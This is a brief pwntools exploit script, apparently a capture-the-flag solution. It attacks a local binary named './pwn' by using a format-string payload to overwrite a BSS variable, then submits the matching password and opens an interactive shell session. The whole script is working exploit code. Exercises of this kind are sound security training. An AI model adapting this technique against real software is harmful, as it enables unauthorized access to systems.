from pwn import *

sh = process('./pwn')

#gdb.attach(sh)
sh.recvuntil(b"your name:")

bss_addr = 0x0804c044

payload = fmtstr_payload(10, {bss_addr: 0x04040404})
sh.sendline(payload)

sh.recvuntil(b'your passwd:')

sh.sendline(str(0x04040404).encode())

sh.interactive()
